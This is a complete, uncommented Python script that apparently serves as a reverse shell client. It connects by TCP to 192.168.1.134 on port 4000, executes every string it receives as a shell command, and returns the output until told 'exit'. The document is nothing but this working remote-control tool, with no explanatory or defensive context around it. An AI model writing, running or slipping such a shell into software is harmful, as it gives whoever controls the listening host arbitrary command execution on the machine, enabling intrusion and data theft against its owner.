import socket 
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.134', 4000))

data = ""

while data != "exit":
        data = s.recv(1024).decode()
        print(data)
        process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        out = process.stdout.read() + process.stderr.read()
        s.send(out) 
s.close()

